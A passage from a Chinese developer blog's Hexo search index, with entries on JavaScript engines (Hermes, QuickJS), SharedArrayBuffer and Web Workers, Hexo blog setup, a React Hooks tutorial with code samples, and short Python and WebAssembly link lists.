    <content type="text"><![CDATA[在 Facebook 发布 Hermes 引擎之前，Fabrice Bellard 以及 C 语言专家 Charlie Gordon 公开发布了 QuickJS。 Facebook发布全新JS引擎！专注提高React Native应用的性能 为了提高 Facebook 应用的性能，我们的团队不断改进自己的 JavaScript 代码和平台。在分析性能数据时，我们发现 JavaScript 引擎本身是影响启动性能和应用包体积的重要因素。有了这些数据，我们意识到必须在比 PC 端限制更多的移动环境中优化 JavaScript 性能。尝试了各种方案后，我们构建了一个新的 JavaScript 引擎：Hermes。它旨在提高应用性能，专注于 React Native 应用，并且在市面上那些内存较少、存储速度较慢且计算能力低下的移动设备上都有良好的表现。 主要特点： 字节码预编译 无 JIT 垃圾回收策略 轻量可嵌入的QuickJS引擎重磅开源，它会是下一个V8吗？ 一路开挂的作者 Fabrice Bellard 是一位法国著名的计算机程序员，因 FFmpeg、QEMU 等项目而闻名业内。他也是最快圆周率算法贝拉公式、TCCBOOT 和 TCC 等项目的作者。 QuickJS 支持 ES2019 规范，包括模块，异步生成器和代理，主要特点： 小巧且易于嵌入：只需几个 C 文件，无外部依赖，x86 下一个简单的 hello world 示例程序仅 190 KB 的大小。 具有极低启动时间的快速解释器：在台式 PC 的单核上，在大约 100 秒内运行 ECMAScript 测试套件56000 次测试。运行时实例的完整生命周期在不到 300 微秒的时间内完成。 支持 ES2019 ，包括模块、异步生成器和完整的 Annex B 支持（传统的 Web 兼容性）。 100％的通过了 ECMAScript 测试用例。 可以将 Javascript 源编译为没有外部依赖的可执行文件。 使用引用计数（以减少内存使用并具有确定性行为）的垃圾收集与循环删除。 数学扩展：BigInt，BigFloat，运算符重载，bigint 模式，数学模式。 在 Javascript 中实现的具有上下文着色的命令行解释器。 带有 C 库包装库构建的内置标准库。 PS: 前端性能优化终于走到了 js 引擎的层面。为了更好地地了解引擎技术，我们先来温故一下 js 基础机制：开发做了这么多年，你真的了解JS工作机制吗？ JIT 将 JS 视为一种解释性语言是不对的。以前很多年 JS 的确是解释性的，但最近出现了一些变化，这种假设也随之过时了。许多流行的 JS 引擎为了使 JS 执行更快，引入了一种称为 Just-In-Time 编译的功能。简而言之，这意味着 JS 代码会在执行期间直接编译成机器码（至少 V8 是这样做的），不再有解释这一步。这个流程耗时稍长，但输出的结果性能更强。为了在有限的时间内完成工作，V8 实际上有两个编译器（不算与 WebAssembly 相关的内容）。其中一个是通用的，能够非常快地编译任何 JS 代码，但只输出性能一般的结果；而另一个编译速度有点慢，是用来编译常用代码的，其输出结果性能极高。当然，因为 JS 有动态类型的特性，这些编译器也不好做。所以类型不变的情况下第二个编译器的效果最好，能让你的代码运行起来快得多。 堆和栈 在 JS 代码的执行过程中会分配两个内存区域——调用栈和 堆。第一个性能非常高，因此用于连续执行所提供的函数。每个函数调用在调用栈中创建一个所谓的“框架”，其中包含其局部变量的副本和 this。你可以通过 Chrome 调试器查看它。就像在其他与堆栈类似的数据结构中一样，调用栈的帧被推送或弹出堆栈，具体取决于正在执行或终止的新函数。你可能见过调用栈上限溢出错误，通常是由于某种形式的无限循环导致的。 谈到堆，就像现实生活中一样，JS 堆是存储本地范围之外对象的地方。它比调用栈慢得多。这就是为什么访问本地变量时速度可能会快很多。堆也是存放未被访问或使用的对象的地方，这种对象就是垃圾。有垃圾就要有垃圾回收器。需要时 JS 运行时的垃圾回收器就会激活，清理堆并释放内存。 前端内存相关探索 堆和栈 在前端中，被存储在栈内的数据包括小数值型，string ，boolean 和复杂类型的地址索引。所谓小数值数据(small number), 即长度短于 32 位存储空间的 number 型数据。一些复杂的数据类型，诸如 Array，Object 等，是被存在堆中的。 共享内存 当程序变的过于复杂时，我们希望通过 webworker 来开启新的独立线程，完成独立计算。 开启新的线程伴随而来的问题就是通讯问题。webworker 的 postMessage 可以帮助我们完成通信，但是这种通信机制是将数据从一部分内存空间复制到主线程的内存下。这个赋值过程就会造成性能的消耗。 而共享内存，顾名思义，可以让我们在不同的线程间，共享一块内存，这些现成都可以对内存进行操作，也可以读取这块内存。省去了赋值数据的过程，不言而喻，整个性能会有较大幅度的提升。 使用原始的 postMessage 方法进行数据传输使用，每一个消息内的数据在不同的线程中，都是被克隆一份以后再传输的。数据量越大，数据传输速度越慢。 sharedBufferArray 的消息传递通过共享内存传递的数据，在 worker 中改变了数据以后，主线程的原始数据也被改变了。 main.js 1234567891011121314151617181920var worker = new Worker(&apos;./sharedArrayBufferWorker.js&apos;);worker.onmessage = function(e)&#123; // 传回到主线程已经被计算过的数据 console.log(&quot;e.data&quot;,&quot; -- &quot;, e.data ); // SharedArrayBuffer(3) &#123;&#125; // 和传统的 postMessage 方式对比，发现主线程的原始数据发生了改变 console.log(&quot;int8Array-outer&quot;,&quot; -- &quot;, int8Array ); // Int8Array(3) [2, 3, 4]&#125;;var sharedArrayBuffer = new SharedArrayBuffer(3);var int8Array = new Int8Array(sharedArrayBuffer);int8Array[0] = 1;int8Array[1] = 2;int8Array[2] = 3;worker.postMessage(sharedArrayBuffer); worker.js 12345678910111213onmessage = function(e)&#123; var arrayData = increaseData(e.data); postMessage(arrayData);&#125;;function increaseData(arrayData)&#123; var int8Array = new Int8Array(arrayData); for(let i = 0; i &lt; int8Array.length; i++)&#123; int8Array[i] += 1; &#125; return arrayData;&#125; 前端 Web Workers 到底是什么？ worker线程的使用有一些注意点 同源限制 worker线程执行的脚本文件必须和主线程的脚本文件同源，这是当然的了，总不能允许worker线程到别人电脑上到处读文件吧 文件限制 为了安全，worker线程无法读取本地文件，它所加载的脚本必须来自网络，且需要与主线程的脚本同源 DOM操作限制 worker线程在与主线程的window不同的另一个全局上下文中运行，其中无法读取主线程所在网页的DOM对象，也不能获取 document、 window等对象，但是可以获取 navigator、 location(只读)、XMLHttpRequest、 setTimeout族等浏览器API。 通信限制 worker线程与主线程不在同一个上下文，不能直接通信，需要通过 postMessage方法来通信。 脚本限制 worker线程不能执行 alert、 confirm，但可以使用 XMLHttpRequest 对象发出ajax请求。 漫谈前端性能 突破 React 应用瓶颈 React 结合 Web worker ? 尝试在 Web worker 中运行 React Virtual DOM 的相关计算，即将 React core 部分移入 Web worker 线程中 ? 还真有人提出类似想法：3092 issue，但是提案被拒绝了，react 选择的是 React Fiber。 但是这个并不妨碍 Web worker 成为 “民间” 的 react 性能解药： React Redux 中间件思想遇见 Web Worker 的灵感（附demo）另外举个例子对比: http://web-perf.github.io/react-worker-dom/ 参考文章 硬核JS」一次搞懂JS运行机制]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>Web前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hexo & github page 搭建博客]]></title>
    <url>%2F2019%2F08%2F17%2F%E5%85%B6%E4%BB%96%2Fhexo%20%26%20github%20page%20%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%2F</url>
    <content type="text"><![CDATA[搭建搭建过程参考这篇文章：手把手教你使用 Hexo + Github Pages 搭建个人独立博客 Hexo 主题配置建议设置为 next 主题 克隆仓库 12// git clone命令将Next仓库克隆到hexo目录下的themes/nextgit clone https://github.com/theme-next/hexo-theme-next.git themes/next 设置 Next 主题 12345// 在站点根目录下，设置以下代码：# Extensions## Plugins: https://hexo.io/plugins/## Themes: https://hexo.io/themes/theme: hexo-theme-next #此处填入你在themes目录下的next主题文件名 个性化设置大致设置过程参见这篇文章： Hexo 搭建的 GitHub 博客之优化大全 开启文章阅读次数功能 第一种方法：LeanCloud (参考这篇文章：https://www.jianshu.com/p/702a7aec4d00) 去 LeanCloud ，创建新应用，创建 Counter 类 修改主题文件 1234leancloud_visitors: enable: true #将原来的false改为true app_id: #&lt;app_id&gt; app_key: #&lt;app_key&gt; 第二种方法： 开启不蒜子统计功能 在主题配置文件中 _config.yml ： 1234567891011121314# Show Views/Visitors of the website/page with busuanzi.# Get more information on http://ibruce.info/2015/04/04/busuanzi/busuanzi_count: enable: true site_uv: true #total visitors site_uv_icon: #user-circle site_uv_header: 你是来访的第 site_uv_footer: 位小伙伴 site_pv: false #total views site_pv_icon: eye site_pv_header: 访问次数： site_pv_footer: 次 post_views: false post_views_icon: eye 不过因为域名过期问题，next 默认集成的 valine 脚本无法访问，解决办法参见：hexo 博客解决不蒜子统计无法显示问题 开启 valine 评论功能大致设置过程参考这篇文章： Hexo 博客使用 valine 评论系统无效果及终极解决方案 需要特别注意的是： valine 评论和文章阅读次数功能均基于 LeanCloud，两者有冲突。如果想同时使用评论和统计功能，解决的办法是：基于 LeanCloud 开启 valine 评论，基于不蒜子开启文章统计功能。 参考文章 手把手教你使用 Hexo + Github Pages 搭建个人独立博客 Hexo 搭建的 GitHub 博客之优化大全 hexo 博客解决不蒜子统计无法显示问题 Hexo 博客使用 valine 评论系统无效果及终极解决方案]]></content>
      <categories>
        <category>其他</category>
      </categories>
      <tags>
        <tag>其他</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[React Hooks 指南]]></title>
    <url>%2F2019%2F08%2F15%2FWeb%E5%89%8D%E7%AB%AF%2FReact%20Hooks%20%E6%8C%87%E5%8D%97%2F</url>
    <content type="text"><![CDATA[WhatReact v16.7.0-alpha 中第一次引入了 Hooks 的概念，在 v16.8.0 版本正式发布 React Hooks ，其带来的最大的变化在于给予了Function Component (函数式组件)类似组件生命周期的概念，扩大了 Function Component 的应用范围。 目前 Function Component 基本属于 dump 组件，Hooks 的出现使得 Function Component 有了自己的状态与业务逻辑，简单逻辑在自己内部处理即可，不再需要通过 Props 的传递，使简单逻辑组件抽离更加方便，也使使用者无需关心组件内部的逻辑，只关心 Hooks 组件返回的结果即可。 官方提供的 Hooks： 基本：useState 、useEffect 、 useContext 额外：useCallback 、 useReducer 、 useMemo 、 useRef 、 useLayoutEffect、 useImperativeHandle 、 useDebugValue 使用条件 仅从 React 功能组件调用 hooks，不要从常规 js 函数中调用 hooks。 只能在顶层调用，不能在 for 循环、if 条件判断、 *函数嵌套 *中使用。（Ps：React Hooks: 不是魔法只是数组 一文中有解释为什么 hooks 只能在顶层调用。） 环境条件 开启 ESLint 插件：eslint-plugin-react-hooks。 Why React Hooks 主要解决以下三个主要的问题： 代码重用：在 Hooks 出来之前，常见的代码重用方式是 HOC 和 render props，这两种方式带来的问题是： 你需要解构自己的组件，非常的笨重，同时会带来很深的组件嵌套。 难以重用和共享组件中的与状态相关的逻辑，造成产生很多巨大的组件。 复杂的组件逻辑：在 class 组件中，有许多的 lifecycle 函数，当我们的组件需要处理多个互不相关的 local state 时，每个生命周期函数中可能会包含着各种互不相关的逻辑在里面，最终导致逻辑复杂的组件难以开发与维护。 class 组件的困惑： 复杂的模式，如渲染道具和高阶组件。 由于业务变动，函数组件不得不改为类组件 一个 React 项目，是由无数个大大小小的组件组合而成的。在 React 的世界中，组件是一等公民。而我们平时拆分组件的依据无非是：尽量的复用代码。组件是UI + 逻辑的复用，但逻辑复用能力等于 0。虽然 React 提供了 HOC 与 Render Props 两种方式来解决逻辑复用的问题，但由于 renderProps 嵌套问题等原因，这种解法并没有让逻辑复用流行起来。 React Hooks 很好的解决了逻辑复用的问题，同时还解决了状态共享的问题，是继 render-props 和 higher-order components 之后的第三种状态共享方案，且不会产生 JSX 嵌套地狱问题。 对于 Hooks、Render Props 和高阶组件来说，它们都有各自的使用场景： Hooks： 替代 Class 的大部分用例，除了 getSnapshotBeforeUpdate 和 componentDidCatch 还不支持。 提取复用逻辑。除了有明确父子关系的，其他场景都可以使用 Hooks。 Render Props：在组件渲染上拥有更高的自由度，可以根据父组件提供的数据进行动态渲染。适合有明确父子关系的场景。 高阶组件：适合用来做注入，并且生成一个新的可复用组件。适合用来写插件。 HowuseState useState(0) 返回是个数组形式，useState(0) 代表 count 的初始值是 0，useState 现阶段只能传入一个初始值。useState 类似 setState，你可以看做是异步的，但 useState 必须保证执行顺序一一致，React 为每一次的 useState 调用分配一个空间，通过 useState 调用顺序辨别各个空间。 12345678910const Counter = () =&gt; &#123; const [count, setCount] = useState(0); const increment = () =&gt; setCount(count + 1); return ( &lt;&gt; &lt;h1&gt;&#123;count&#125;&lt;/h1&gt; &lt;button onClick=&#123;increment&#125;&gt;+&lt;/button&gt; &lt;/&gt; )&#125; useEffect 如果我们需要在一些特定的生命周期或者值变化后做一些操作的话，必须借助 useEffect 的一些特性去实现。 useState 产生的 changeState 方法并没有提供类似于 setState 的第二个参数一样的功能，因此如果需要在 State 改变后执行一些方法，必须通过 useEffect 实现。 useEffect 的代码既会在初始化时候执行，也会在后续每次 rerender 时执行，接受两个参数：第一个参数为副作用需要执行的回调，生成的回调方法可以返回一个函数（将在组件卸载时运行）；第二个为该副作用监听的状态数组，当对应状态发生变动时会执行副作用，如果第二个参数为空，那么在每一个 State 变化时都会执行该副作用。 使用 useEffect 实现类组件中生命周期： useEffect 如果第二个参数数组中的成员变量为空，则表示与该副作用相关联的状态为空，不管其他状态如何变动，该副作用都不会再次执行，即实现了 effect 只会在组件 componentDidMount 和 componentWillUnmout 时期执行。 123useEffect(() =&gt; &#123; // 每次componentDidMount会调用这里&#125;,[]) 如果需要在 componentWillUnmount 需要执行一些事件，可以 return 返回时候进行操作。 123456useEffect(() =&gt; &#123; //只有componentDidMount时候调用这里 return () =&gt; &#123; // componentWillUnmount &#125;;&#125;, []) useEffect 模拟 componentDidpdate，该生命周期在每次页面更新后都会被调用，那么可以利用 useEffect 如果第二个参数为空，那么在每一个 State 变化时都会执行该副作用的特性。 12345678const mounted = useRef();useEffect(() =&gt; &#123; if(!mounted.current)&#123; mounted.current = true; &#125; else &#123; // 执行 componentDidpdate &#125;&#125;) useLayoutEffect如果副作用是跟 DOM 相关的，需要使用 useLayoutEffect。useLayoutEffect 中的副作用会在 DOM 更新之后同步执行。 1234567891011121314function App() &#123; const [width, setWidth] = useState(0); useLayoutEffect(() =&gt; &#123; const title = document.querySelector(&apos;#title&apos;); const titleWidth = title.getBoundingClientRect().width; if (width !== titleWidth) &#123; setWidth(titleWidth); &#125; &#125;); return &lt;div&gt; &lt;h1 id=&quot;title&quot;&gt;hello&lt;/h1&gt; &lt;h2&gt;&#123;width&#125;&lt;/h2&gt; &lt;/div&gt;&#125; useReduceruseReducer 接收两个参数，一个是 reducer 函数，跟 redux 中的 reducer 是一样的；另外一个是初始的状态值。返回的是一个数组，数组中的第一个元素是状态值，第二个元素是 dispatch 函数。 12345678910111213141516171819202122const reducer = (state, action) =&gt; &#123; switch(action.type) &#123; case &apos;increment&apos;: return &#123;count: state.count + 1&#125;; case &apos;decrement&apos;: return &#123;count: state.count - 1&#125;; case &apos;reset&apos;: return initState; default: return state; &#125;&#125;;function App() &#123; const [state, dispatch] = useReducer(reducer, initState); return &lt;div&gt; &lt;h1&gt;&#123;state.count&#125;&lt;/h1&gt; &lt;button onClick=&#123;() =&gt; dispatch(&#123;type: &apos;increment&apos;&#125;)&#125;&gt;+&lt;/button&gt; &lt;button onClick=&#123;() =&gt; dispatch(&#123;type: &apos;decrement&apos;&#125;)&#125;&gt;-&lt;/button&gt; &lt;button onClick=&#123;() =&gt; dispatch(&#123;type: &apos;reset&apos;&#125;)&#125;&gt;reset&lt;/button&gt; &lt;/div&gt;&#125; useRefuseRef：在函数组件中获取组件或DOM节点的引用。 12345678function App() &#123; const inputRef = useRef(null); return &lt;div&gt; &lt;input type=&quot;text&quot; ref=&#123;inputRef&#125;/&gt; &lt;button onClick=&#123;() =&gt; inputRef.current.focus()&#125;&gt;focus&lt;/button&gt; &lt;/div&gt;&#125; 还可以用useRef来保存一些值的引用，并对它进行读写。举个例子： 1234567891011121314151617const useValues = () =&gt; &#123; const [values, setValues] = useState(&#123;&#125;); const latestValues = useRef(values); useEffect(() =&gt; &#123; latestValues.current = values; &#125;); const [updateData] = useCallback((nextData) =&gt; &#123; setValues(&#123; data: nextData, count: latestValues.current.count + 1, &#125;); &#125;, []); return [values, updateData];&#125;; 在使用 ref 时要特别小心，因为它可以随意赋值，所以一定要控制好修改它的方法。特别是一些底层模块，在封装的时候千万不要直接暴露 ref，而是提供一些修改它的方法。 useContext、useReducerContext 的作用就是对它所包含的组件树提供全局共享数据的一种技术。useReducer 结合 useContext，通过 context 把 dispatch 函数提供给组件树中的所有组件使用 ，而不用通过 props 添加回调函数的方式一层层传递。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475// 定义初始化值const initState = &#123; name: &apos;&apos;, pwd: &apos;&apos;, isLoading: false, error: &apos;&apos;, isLoggedIn: false,&#125;// 定义state[业务]处理逻辑 reducer函数function loginReducer(state, action) &#123; switch(action.type) &#123; case &apos;login&apos;: return &#123; ...state, isLoading: true, error: &apos;&apos;, &#125; case &apos;success&apos;: return &#123; ...state, isLoggedIn: true, isLoading: false, &#125; case &apos;error&apos;: return &#123; ...state, error: action.payload.error, name: &apos;&apos;, pwd: &apos;&apos;, isLoading: false, &#125; default: return state; &#125;&#125;// 定义 context函数const LoginContext = React.createContext();function LoginPage() &#123; const [state, dispatch] = useReducer(loginReducer, initState); const &#123; name, pwd, isLoading, error, isLoggedIn &#125; = state; const login = (event) =&gt; &#123; event.preventDefault(); dispatch(&#123; type: &apos;login&apos; &#125;); login(&#123; name, pwd &#125;) .then(() =&gt; &#123; dispatch(&#123; type: &apos;success&apos; &#125;); &#125;) .catch((error) =&gt; &#123; dispatch(&#123; type: &apos;error&apos; payload: &#123; error: error.message &#125; &#125;); &#125;); &#125; // 利用 context 共享dispatch return ( &lt;LoginContext.Provider value=&#123;dispatch&#125;&gt; &lt;...&gt; &lt;LoginButton /&gt; &lt;/LoginContext.Provider&gt; )&#125;function LoginButton() &#123; // 子组件中直接通过context拿到dispatch，出发reducer操作state const dispatch = useContext(LoginContext); const click = () =&gt; &#123; if (error) &#123; // 子组件可以直接 dispatch action dispatch(&#123; type: &apos;error&apos; payload: &#123; error: error.message &#125; &#125;); &#125; &#125;&#125; 注：局部状态不推荐使用 useReducer ，会导致函数内部状态过于复杂，难以阅读。 useReducer 建议在多组件间通信时，结合 useContext 一起使用。 参考 react-redux useMemo当状态发生变化时，没有设置关联状态的 useEffect 会全部执行。同样的，通过计算出来的值或者引入的组件也会重新计算/挂载一遍，即使与其关联的状态没有发生任何变化。 为了解决这个问题，引入了 useMemo 来实现类组件中 shouldComponetUpdate 的性能优化。 useMemo 接受两个参数，第一个参数为一个 Getter 方法，返回值为要缓存的数据或组件，第二个参数为该返回值相关联的状态，当其中任何一个状态发生变化时就会重新调用 Getter 方法生成新的返回值。 12345678910111213141516171819import React, &#123; useState, useMemo &#125; from &apos;react&apos;;import &#123; message &#125; from &apos;antd&apos;;export default function HookDemo() &#123; const [count1, changeCount1] = useState(0); const [count2, changeCount2] = useState(10); const calculateCount = useMemo(() =&gt; &#123; message.info(&apos;重新生成计算结果&apos;); return count1 * 10; &#125;, [count1]); return ( &lt;div&gt; &#123;calculateCount&#125; &lt;button onClick=&#123;() =&gt; &#123; changeCount1(count1 + 1); &#125;&#125;&gt;改变count1&lt;/button&gt; &lt;button onClick=&#123;() =&gt; &#123; changeCount2(count2 + 1); &#125;&#125;&gt;改变count2&lt;/button&gt; &lt;/div&gt; );&#125; useCallbackuseCallback 用户生成 Callback ，配合useEffect 使用，抽离不同 useEffect 中存在的相同逻辑的封装，减少代码冗余。 useCallback 的使用方法和 useEffect 一致，第一个参数为生成的回调方法，第二个参数为该方法关联的状态，任一状态发生变动都会重新生成新的回调。 1234567891011121314const [count1, changeCount1] = useState(0);const [count2, changeCount2] = useState(10);const calculateCount = useCallback(() =&gt; &#123; if (count1 &amp;&amp; count2) &#123; return count1 * count2; &#125; return count1 + count2;&#125;, [count1, count2])useEffect(() =&gt; &#123; const result = calculateCount(count, count2); message.info(`执行副作用，最新值为$&#123;result&#125;`);&#125;, [calculateCount]) Custom Hooks举个🌰，自定义监听窗口大小组件： 12345678// 一个显示目前窗口大小的组件function responsiveComponent()&#123; // custom hooks const width = useWindowWidth(); return ( &lt;p&gt;当前窗口的宽度是 &#123;width&#125;&lt;/p&gt; )&#125; 自定义 useWindowWidth， 窗口调整大小时使用副作用来设置状态： 1234567891011121314import &#123; useState, useEffect&#125; from &apos;react&apos;;// custom hooks to listen window width changefunction useWindowWidth()&#123; const [width, setWidth] = useState(window.innerWidth); useEffect(() =&gt; &#123; const handleResize = ()=&gt;&#123; setWidth(window.innerWidth); &#125; window.addEventListener(&apos;resize&apos;, handleResize); &#125;, [width]); // width 没有变化则不处理 return width;&#125; 注： custom hooks 还可以参考一个有意思的 hooks 库 react-use。 原理useState 底层实现 React Hooks: 不是魔法，只是数组 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354let state = [];let setters = [];let firstRun = true;let cursor = 0;function createSetter(cursor) &#123; return function setterWithCursor(newVal) &#123; state[cursor] = newVal; &#125;;&#125;// This is the pseudocode for the useState helperexport function useState(initVal) &#123; if (firstRun) &#123; state.push(initVal); setters.push(createSetter(cursor)); firstRun = false; &#125; const setter = setters[cursor]; const value = state[cursor]; cursor++; return [value, setter];&#125;// Our component code that uses hooksfunction RenderFunctionComponent() &#123; const [firstName, setFirstName] = useState(&quot;Rudi&quot;); // cursor: 0 const [lastName, setLastName] = useState(&quot;Yardley&quot;); // cursor: 1 return ( &lt;div&gt; &lt;Button onClick=&#123;() =&gt; setFirstName(&quot;Richard&quot;)&#125;&gt;Richard&lt;/Button&gt; &lt;Button onClick=&#123;() =&gt; setFirstName(&quot;Fred&quot;)&#125;&gt;Fred&lt;/Button&gt; &lt;/div&gt; );&#125;// This is sort of simulating Reacts rendering cyclefunction MyComponent() &#123; cursor = 0; // resetting the cursor return &lt;RenderFunctionComponent /&gt;; // render&#125;console.log(state); // Pre-render: []MyComponent();console.log(state); // First-render: [&apos;Rudi&apos;, &apos;Yardley&apos;]MyComponent();console.log(state); // Subsequent-render: [&apos;Rudi&apos;, &apos;Yardley&apos;]// click the &apos;Fred&apos; buttonconsole.log(state); // After-click: [&apos;Fred&apos;, &apos;Yardley&apos;] Hooks 下的数据流管理 社区有一个非常轻量的库 unstate-next ，可以做到管理全局的 state ： 12345678910111213141516171819202122232425262728293031323334353637383940import React, &#123; useState &#125; from &quot;react&quot;import &#123; createContainer &#125; from &quot;unstated-next&quot;import &#123; render &#125; from &quot;react-dom&quot;function useCounter(initialState = 0) &#123; let [count, setCount] = useState(initialState) let decrement = () =&gt; setCount(count - 1) let increment = () =&gt; setCount(count + 1) return &#123; count, decrement, increment &#125;&#125;let Counter = createContainer(useCounter)function CounterDisplay() &#123; let counter = Counter.useContainer() return ( &lt;div&gt; &lt;button onClick=&#123;counter.decrement&#125;&gt;-&lt;/button&gt; &lt;span&gt;&#123;counter.count&#125;&lt;/span&gt; &lt;button onClick=&#123;counter.increment&#125;&gt;+&lt;/button&gt; &lt;/div&gt; )&#125;function App() &#123; return ( &lt;Counter.Provider&gt; &lt;CounterDisplay /&gt; &lt;Counter.Provider initialState=&#123;2&#125;&gt; &lt;div&gt; &lt;div&gt; &lt;CounterDisplay /&gt; &lt;/div&gt; &lt;/div&gt; &lt;/Counter.Provider&gt; &lt;/Counter.Provider&gt; )&#125;render(&lt;App /&gt;, document.getElementById(&quot;root&quot;)) 参考文章 理解 React Hooks React hooks: 不是魔法只是数组 React Hook 解析 How to fetch data with React Hooks React Hooks 是不能替代 Redux 的 看完这篇，你也能把 React Hooks 玩出花 Hooks 时代的 React 状态管理方案]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>Web前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python 传送门]]></title>
    <url>%2F2019%2F08%2F15%2FPython%2FPython%20%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99%E4%BC%A0%E9%80%81%E9%97%A8%2F</url>
    <content type="text"><![CDATA[基础语法 Python 官网 Python tutorial Python Cookbook Python 从新手到大师 github 资料 廖雪峰 Python 教程 oj pythontip]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WebAssembly 传送门]]></title>
    <url>%2F2019%2F08%2F15%2FWebAssembly%2FWebAssembly%20%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99%E4%BC%A0%E9%80%81%E9%97%A8%2F</url>
    <content type="text"><![CDATA[Web端H.265播放器研发解密: https://mp.weixin.qq.com/s/ajLFM8q-4-2hxj-M_ChGdg]]></content>
      <categories>
        <category>WebAssembly</category>
      </categories>
      <tags>
        <tag>WebAssembly</tag>
      </tags>
  </entry>
</search>
